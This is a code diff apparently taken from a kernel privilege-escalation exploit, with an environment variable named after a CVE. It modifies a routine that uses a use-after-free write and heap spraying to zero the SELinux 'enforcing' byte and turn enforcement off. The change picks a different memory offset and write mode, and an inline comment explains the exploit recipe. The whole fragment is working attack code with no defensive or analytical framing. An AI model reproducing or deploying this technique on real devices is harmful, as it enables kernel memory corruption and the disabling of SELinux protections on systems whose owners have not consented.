@@ -7724,11 +7724,22 @@ static int direct_resolve_ksud(void) {
 static int direct_enforce_window(unsigned long long sel, const struct exp_opts *o,
                                  int open_window) {
     long spray_n = o->spray_n, spread_ms = o->spread_ms;
-    unsigned long long target = open_window ? sel - 1 : sel - 2;
+    /*
+     * Opening: zero word at sel-7 (98260/5.15 recipe).  The only in-struct
+     * byte changed is enforcing (sym+0 -> 0); sym+1 (initialized) and all
+     * following fields stay untouched.  The 7 bytes before the struct are a
+     * zeroed (i.e. unlocked) mutex, harmless.
+     * Restoring: V1 word at sel-2 makes enforcing non-zero (0x0e); this is a
+     * failure-path only write (a Live KSU restores Enforcing itself).
+     */
+    int use_zero = getenv("CVE99491_SEL_OPEN_LEGACY") == NULL;
+    unsigned long long target = open_window ? (use_zero ? sel - 7 : sel - 1)
+                                             : sel - 2;
+    int mode = (open_window && use_zero) ? DIRECT_WORD_ZERO : DIRECT_WORD_V1;
     int want = open_window ? 0 : 1;
 
     for (int t = 0; t < 4; t++) {
-        if (direct_uaf_write(target, DIRECT_WORD_V1, spray_n, spread_ms) < 0)
+        if (direct_uaf_write(target, mode, spray_n, spread_ms) < 0)
             return -1;
         usleep(20000);
         if (selinux_enforce_now() == want)
